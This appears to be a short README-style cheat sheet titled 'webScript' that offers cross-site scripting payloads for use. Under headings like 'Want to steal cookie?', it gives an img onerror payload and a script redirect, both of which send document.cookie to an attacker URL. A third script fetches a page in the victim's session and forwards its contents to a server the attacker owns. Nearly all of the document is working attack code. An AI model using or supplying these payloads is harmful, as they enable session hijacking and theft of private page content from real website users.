# webScript

## Want to steal cookie ? 
Try this:
```
<img src="" onerror="this.src='[URL]?cookie='+document.cookie;"></img>
```
```
<script>document.location='[URL]?c='+document.cookie</script>
```

## Want to know how other see some page?
```
<script> fetch("[URL-PAGE TO BE STOLEN]")
.then((result) => { return result.text(); })
.then((content) => {
    fetch('[URL-SERVER THAT I OWN ]?c='+content)
    ; }); </script>
```
